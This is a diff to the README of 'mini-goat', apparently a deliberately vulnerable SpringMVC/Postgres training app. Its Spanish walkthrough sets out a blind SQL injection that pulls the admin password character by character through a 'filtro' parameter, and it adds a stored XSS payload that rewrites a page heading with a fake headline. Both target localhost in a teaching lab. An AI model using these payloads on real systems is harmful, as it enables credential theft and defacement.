@@ -8,6 +8,8 @@ It's a web-app made with SpringMVC and Postgres. Should be easily setup.
 
 ## Injections
 
+    [http://localhost:8080/mini-goat/usuarios/listado.do?filtro=](http://localhost:8080/mini-goat/usuarios/listado.do?filtro=)
+
 1. comprobamos que es un like:
 
     a
@@ -52,3 +54,9 @@ pipo' or exists (select 1 from usuarios where substring(password, 1, 1) = '1' an
 10. así sucesivamente, hasta sacar todos los caracteres de la contraseña
 
 pipo' or exists (select 1 from usuarios where substring(password, 1, 1) = '1' and substring(password, 2, 1) = '2' and substring(password, 3, 1) = '3' and substring(password, 4, 1) = '4' and username = 'admin') and '1' like '1
+
+## XSS
+
+    [http://localhost:8080/mini-goat/noticias/leer.do?id=1](http://localhost:8080/mini-goat/noticias/leer.do?id=1)
+
+    <script>document.getElementsByTagName("h1")[0].innerHTML = "Obama perdonó la deuda con Argentina";</script>
